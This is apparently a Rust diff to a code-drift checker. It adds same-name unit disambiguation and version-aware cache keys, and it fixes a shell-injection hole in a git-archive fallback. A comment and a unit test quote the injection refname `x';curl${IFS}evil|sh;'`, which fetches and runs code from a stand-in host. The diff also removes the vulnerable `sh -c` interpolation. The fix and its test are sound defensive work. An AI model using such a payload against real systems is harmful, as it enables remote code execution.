@@ -13,8 +13,9 @@ use crate::report::{Group, Member, Stats, Tier, UnitSummary};
 use anyhow::{Context, bail};
 use serde::Serialize;
 use std::collections::{HashMap, HashSet};
+use std::ffi::OsString;
 use std::path::{Path, PathBuf};
-use std::process::Command;
+use std::process::{Command, Stdio};
 
 /// Divergence increase below this is measurement noise, not drift (D20).
 pub const DIVERGENCE_EPS: f64 = 0.01;
@@ -194,6 +195,76 @@ fn member_matches(bm: &BaselineMember, file_rel: &str, name: &str, span: (u32, u
             || spans_overlap(span, bm.line_span))
 }
 
+/// Line distance between two spans; 0 when they overlap.
+fn span_distance(a: (u32, u32), b: (u32, u32)) -> u32 {
+    if spans_overlap(a, b) {
+        0
+    } else if a.1 < b.0 {
+        b.0 - a.1
+    } else {
+        a.0 - b.1
+    }
+}
+
+/// Among same-file candidates, pick the one best matching `target`: an
+/// overlapping span beats a merely-near one, ties broken by least line distance.
+fn best_span_match<'a>(cands: &[&'a UnitSummary], target: (u32, u32)) -> Option<&'a UnitSummary> {
+    cands
+        .iter()
+        .min_by_key(|u| {
+            (
+                !spans_overlap(u.line_span, target),
+                span_distance(u.line_span, target),
+            )
+        })
+        .copied()
+}
+
+/// Map a baseline member `bm` onto the current unit list `us` for its file
+/// (spec §6.1: line numbers shift, fingerprints are stable). Names are NOT
+/// unique — Rust `fn new` across impl blocks, trait `fmt` impls, Go same-named
+/// methods on different receivers — so when several units share `bm.name`,
+/// disambiguate by span overlap / nearness, and for fingerprint-guarded tiers
+/// prefer a same-name candidate whose fingerprint matches the group. A UNIQUE
+/// name keeps the historical "name wins" behavior. With no usable/matching
+/// name, fall back to the fingerprint-guarded span-overlap map (tacky-muck).
+fn select_unit<'a>(
+    us: &[&'a UnitSummary],
+    bm: &BaselineMember,
+    fingerprint: &str,
+    fp_guarded: bool,
+) -> Option<&'a UnitSummary> {
+    if !bm.name.is_empty() && bm.name != "<anon>" {
+        let named: Vec<&'a UnitSummary> =
+            us.iter().copied().filter(|u| u.name == bm.name).collect();
+        match named.as_slice() {
+            [] => {}                      // no name match: fall through to span-overlap
+            [only] => return Some(*only), // unique name: historical behavior
+            many => {
+                // Multiple same-named units. For fp-guarded tiers, prefer the
+                // fingerprint match(es); then the best span match among the pool.
+                let fp_matches: Vec<&'a UnitSummary> = if fp_guarded {
+                    many.iter()
+                        .copied()
+                        .filter(|u| u.fingerprint == fingerprint)
+                        .collect()
+                } else {
+                    Vec::new()
+                };
+                let pool = if fp_matches.is_empty() {
+                    many
+                } else {
+                    fp_matches.as_slice()
+                };
+                return best_span_match(pool, bm.line_span);
+            }
+        }
+    }
+    us.iter().copied().find(|u| {
+        spans_overlap(u.line_span, bm.line_span) && (!fp_guarded || u.fingerprint == fingerprint)
+    })
+}
+
 /// Temp worktree of the base ref; removed on drop.
 struct BaseWorktree {
     repo: PathBuf,
@@ -201,6 +272,27 @@ struct BaseWorktree {
     /// True when populated via the git-archive fallback: nothing to
     /// `git worktree remove` on drop.
     archived: bool,
+}
+
+/// Argv (arguments only) for the `git archive | tar -x` base fallback, as two
+/// verbatim vectors — NO shell. `base` flows from untrusted input (`--base` or
+/// a scanned repo's `[baseline] ref`), and a git refname may legally contain
+/// `'"$;|{}`; the old `sh -c` string-interpolated it, so a malicious ref like
+/// `x';curl${IFS}evil|sh;'` executed arbitrary commands (cute-coral). Passing
+/// every value as its own argv element makes those metacharacters inert.
+fn archive_argv(repo: &Path, base: &str, dest: &Path) -> (Vec<OsString>, Vec<OsString>) {
+    let git = vec![
+        OsString::from("-C"),
+        repo.as_os_str().to_os_string(),
+        OsString::from("archive"),
+        OsString::from(base),
+    ];
+    let tar = vec![
+        OsString::from("-x"),
+        OsString::from("-C"),
+        dest.as_os_str().to_os_string(),
+    ];
+    (git, tar)
 }
 
 impl BaseWorktree {
@@ -228,21 +320,34 @@ impl BaseWorktree {
         // attributes, so an attribute-excluded file would be missing from the
         // base scan; acceptable for a fallback path.
         std::fs::create_dir_all(&path)?;
-        let arch = Command::new("sh")
-            .arg("-c")
-            .arg(format!(
-                "git -C '{}' archive '{}' | tar -x -C '{}'",
-                repo.display(),
-                base,
-                path.display()
-            ))
-            .output()?;
+        let (git_args, tar_args) = archive_argv(repo, base, &path);
+        // Spawn `git archive` and pipe its stdout straight into `tar -x`. Every
+        // value is a verbatim argv element — no `sh -c`, so refname/path
+        // metacharacters (`'"$;|{}`) can't be interpreted (cute-coral).
+        let mut git = Command::new("git")
+            .args(&git_args)
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .spawn()
+            .context("spawning git archive for the base fallback")?;
+        let git_stdout = git.stdout.take().expect("git stdout was piped");
+        // tar reads git's stdout to EOF; git exits (closing stdout) on error, so
+        // there is no pipe deadlock and git's tiny stderr is drained after.
+        let tar = Command::new("tar")
+            .args(&tar_args)
+            .stdin(Stdio::from(git_stdout))
+            .output()
+            .context("spawning tar for the base fallback")?;
+        let git = git
+            .wait_with_output()
+            .context("waiting on git archive for the base fallback")?;
         anyhow::ensure!(
-            arch.status.success(),
+            git.status.success() && tar.status.success(),
             "git worktree add for base `{base}` failed ({}) and the git-archive \
-             fallback also failed: {}",
+             fallback also failed (git: {}; tar: {})",
             String::from_utf8_lossy(&out.stderr).trim(),
-            String::from_utf8_lossy(&arch.stderr).trim()
+            String::from_utf8_lossy(&git.stderr).trim(),
+            String::from_utf8_lossy(&tar.stderr).trim(),
         );
         Ok(BaseWorktree {
             repo: repo.to_path_buf(),
@@ -269,6 +374,57 @@ impl Drop for BaseWorktree {
     }
 }
 
+/// Version legs that MUST bust the base-state snapshot when they move — the
+/// exact set the per-file cache key folds in (`src/cache.rs`). The per-file
+/// cache invalidates on a grammar / extraction / IR-scheme / tool-version bump,
+/// but the base-state snapshot is loaded via `Baseline::load`, which validates
+/// ONLY `fingerprint_scheme`. So without these legs a bump serves a STALE
+/// snapshot whose fingerprints mismatch every current group → `baseline_matched`
+/// drops to 0 → every touched duplicate falsely reports `new` and CI fails
+/// (bold-yelp; spec §12: stale fingerprints must never feed baseline/drift
+/// comparisons). Held as a struct so the keying is unit-testable.
+#[derive(Clone)]
+struct VersionLegs<'a> {
+    extraction: u32,
+    fingerprint_scheme: u32,
+    pkg_version: &'a str,
+    grammars: &'a [&'a str],
+    ir_scheme: u32,
+}
+
+impl VersionLegs<'static> {
+    /// The legs this binary was built with — REUSING the same constants the
+    /// per-file cache keys on, never hardcoded (they move independently).
+    fn current() -> Self {
+        VersionLegs {
+            extraction: crate::cache::EXTRACTION_VERSION,
+            fingerprint_scheme: crate::fingerprint::FINGERPRINT_SCHEME,
+            pkg_version: env!("CARGO_PKG_VERSION"),
+            grammars: crate::cache::GRAMMAR_VERSIONS,
+            ir_scheme: crate::ir::kind::SCHEME_VERSION,
+        }
+    }
+}
+
+/// Base-state snapshot cache signature: the config Debug plus every version leg
+/// the per-file cache folds in (bold-yelp). A bump to any leg changes the key,
+/// so `check` rescans the base ref instead of serving a stale snapshot.
+fn base_state_cfg_sig(cfg: &Config, legs: &VersionLegs) -> u64 {
+    let mut buf = Vec::new();
+    buf.extend_from_slice(format!("{cfg:?}").as_bytes());
+    buf.push(0);
+    buf.extend_from_slice(&legs.extraction.to_le_bytes());
+    buf.extend_from_slice(&legs.fingerprint_scheme.to_le_bytes());
+    buf.extend_from_slice(legs.pkg_version.as_bytes());
+    buf.push(0);
+    for v in legs.grammars {
+        buf.extend_from_slice(v.as_bytes());
+        buf.push(0);
+    }
+    buf.extend_from_slice(&legs.ir_scheme.to_le_bytes());
+    xxhash_rust::xxh3::xxh3_64(&buf)
+}
+
 /// Base state for the comparison (spec §6 semantics, two sources):
 /// - a baseline FILE (optional curation layer: fixed "since acceptance"
 ///   reference; the file itself is a derived artifact and defaults to living
@@ -289,7 +445,7 @@ fn base_state(root: &Path, cfg: &Config, base: &str) -> anyhow::Result<(Baseline
         String::from_utf8_lossy(&sha_out.stderr)
     );
     let sha = String::from_utf8_lossy(&sha_out.stdout).trim().to_string();
-    let cfg_sig = xxhash_rust::xxh3::xxh3_64(format!("{cfg:?}").as_bytes());
+    let cfg_sig = base_state_cfg_sig(cfg, &VersionLegs::current());
     let cache_path = root
         .join(".reprise")
         .join("base-state")
@@ -411,18 +567,13 @@ pub fn run(
             let mut untouched: Vec<Member> = Vec::new();
             let mut touched_accepts = true;
             for bm in &e.members {
-                // Map the snapshot onto the current tree: same file, matching
-                // name first, overlapping span (identity-checked) second.
-                let unit = units_by_file.get(&bm.file).and_then(|us| {
-                    us.iter()
-                        .find(|u| u.name == bm.name && bm.name != "<anon>" && !bm.name.is_empty())
-                        .or_else(|| {
-                            us.iter().find(|u| {
-                                spans_overlap(u.line_span, bm.line_span)
-                                    && (!fp_guarded || u.fingerprint == e.fingerprint)
-                            })
-                        })
-                });
+                // Map the snapshot onto the current tree: same file, then name —
+                // but names aren't unique, so same-named candidates are
+                // disambiguated by span/fingerprint; span-overlap is the
+                // fallback (select_unit; tacky-muck).
+                let unit = units_by_file
+                    .get(&bm.file)
+                    .and_then(|us| select_unit(us, bm, &e.fingerprint, fp_guarded));
                 let (is_touched, line_span) = if region {
                     // Regions: span-precise — the diff must intersect the run
                     // itself, not merely the enclosing unit (D39).
@@ -741,5 +892,161 @@ deleted file mode 100644
         assert!(!map.touches("src/a.rs", (42, 45)));
         assert!(map.touches("src/dead.rs", (3, 7)));
         assert!(!map.file_touched("src/other.rs"));
+    }
+
+    // ---- cute-coral: git-archive fallback argv is shell-free ----
+
+    #[test]
+    fn archive_argv_passes_values_verbatim_no_shell() {
+        // A malicious `[baseline] ref` can pin a refname with shell metacharacters;
+        // the old `sh -c` executed them. Each value must be one verbatim argv
+        // element, and no element may be a shell string joining the pieces.
+        let repo = Path::new("/repos/it's mine");
+        let base = "x';curl${IFS}evil|sh;'";
+        let dest = Path::new("/tmp/base dir");
+        let (git, tar) = archive_argv(repo, base, dest);
+        assert_eq!(
+            git,
+            vec![
+                OsString::from("-C"),
+                OsString::from("/repos/it's mine"),
+                OsString::from("archive"),
+                OsString::from("x';curl${IFS}evil|sh;'"),
+            ]
+        );
+        assert_eq!(
+            tar,
+            vec![
+                OsString::from("-x"),
+                OsString::from("-C"),
+                OsString::from("/tmp/base dir"),
+            ]
+        );
+        // The `|` inside `base` is carried verbatim as ONE element (that is the
+        // fix — inert, not a shell pipe). What must NOT exist is an element that
+        // shell-joins git into tar, i.e. the old `| tar` interpolation.
+        assert!(
+            !git.iter()
+                .chain(tar.iter())
+                .any(|a| a.to_string_lossy().contains("| tar"))
+        );
+        // And git's argv never references tar: the two commands are separate.
+        assert!(!git.iter().any(|a| a.to_string_lossy().contains("tar")));
+    }
+
+    // ---- bold-yelp: base-state key folds the version legs ----
+
+    #[test]
+    fn base_state_key_folds_every_version_leg() {
+        let cfg = Config::default();
+        let base = VersionLegs::current();
+        let sig = base_state_cfg_sig(&cfg, &base);
+
+        const OTHER_GRAMMARS: &[&str] = &["tree-sitter/9.9.9-test"];
+        let mut ext = base.clone();
+        ext.extraction = base.extraction.wrapping_add(1);
+        let mut fp = base.clone();
+        fp.fingerprint_scheme = base.fingerprint_scheme.wrapping_add(1);
+        let mut pkg = base.clone();
+        pkg.pkg_version = "0.0.0-test";
+        let mut gram = base.clone();
+        gram.grammars = OTHER_GRAMMARS;
+        let mut ir = base.clone();
+        ir.ir_scheme = base.ir_scheme.wrapping_add(1);
+
+        // Every leg the per-file cache keys on must also move the base-state key,
+        // or a grammar/extraction/scheme/tool bump serves a stale snapshot.
+        for (leg, v) in [
+            ("extraction", &ext),
+            ("fingerprint_scheme", &fp),
+            ("pkg_version", &pkg),
+            ("grammars", &gram),
+            ("ir_scheme", &ir),
+        ] {
+            assert_ne!(
+                sig,
+                base_state_cfg_sig(&cfg, v),
+                "version leg `{leg}` is not folded into the base-state cache key"
+            );
+        }
+        // Same legs ⇒ same key: a genuinely-warm snapshot still hits.
+        assert_eq!(sig, base_state_cfg_sig(&cfg, &VersionLegs::current()));
+    }
+
+    // ---- tacky-muck: same-named units mapped by span/fingerprint ----
+
+    fn unit(name: &str, span: (u32, u32), fp: &str) -> UnitSummary {
+        UnitSummary {
+            file: PathBuf::from("src/a.rs"),
+            name: name.to_string(),
+            line_span: span,
+            fingerprint: fp.to_string(),
+            accept_drift: false,
+        }
+    }
+
+    fn bmember(name: &str, span: (u32, u32)) -> BaselineMember {
+        BaselineMember {
+            file: "src/a.rs".into(),
+            name: name.into(),
+            line_span: span,
+        }
+    }
+
+    #[test]
+    fn select_unit_disambiguates_same_named_by_span() {
+        // Two `fn new` in one file (distinct impl blocks): the OLD name-only map
+        // took the first, mis-scoring drift onto the wrong span.
+        let u_lo = unit("new", (10, 20), "aaa");
+        let u_hi = unit("new", (100, 110), "bbb");
+        let us = vec![&u_lo, &u_hi];
+        // Baseline member sits at the high span → must pick the high unit.
+        let bm = bmember("new", (101, 109));
+        assert_eq!(
+            select_unit(&us, &bm, "zzz", false).unwrap().line_span,
+            (100, 110)
+        );
+        // ...and the low span picks the low unit.
+        let bm2 = bmember("new", (11, 19));
+        assert_eq!(
+            select_unit(&us, &bm2, "zzz", false).unwrap().line_span,
+            (10, 20)
+        );
+    }
+
+    #[test]
+    fn select_unit_prefers_fingerprint_among_same_name_when_guarded() {
+        // fp-guarded tier: among same-named units the fingerprint match wins even
+        // when another same-named unit overlaps the (shifted) baseline span.
+        let u_match = unit("new", (10, 20), "GROUP");
+        let u_other = unit("new", (30, 40), "other");
+        let us = vec![&u_match, &u_other];
+        let bm = bmember("new", (31, 39)); // span overlaps u_other
+        assert_eq!(
+            select_unit(&us, &bm, "GROUP", true).unwrap().fingerprint,
+            "GROUP"
+        );
+    }
+
+    #[test]
+    fn select_unit_unique_name_keeps_historical_behavior() {
+        // A single same-named unit maps regardless of span (the name is the stable
+        // key when unique; line numbers shift, spec §6.1).
+        let u = unit("solo", (10, 20), "aaa");
+        let us = vec![&u];
+        let bm = bmember("solo", (900, 950));
+        assert_eq!(
+            select_unit(&us, &bm, "zzz", false).unwrap().line_span,
+            (10, 20)
+        );
+    }
+
+    #[test]
+    fn select_unit_anon_falls_back_to_span_overlap() {
+        let u = unit("<anon>", (10, 20), "aaa");
+        let us = vec![&u];
+        assert!(select_unit(&us, &bmember("<anon>", (15, 18)), "aaa", false).is_some());
+        // Non-overlapping anonymous member → no map.
+        assert!(select_unit(&us, &bmember("<anon>", (100, 110)), "aaa", false).is_none());
     }
 }
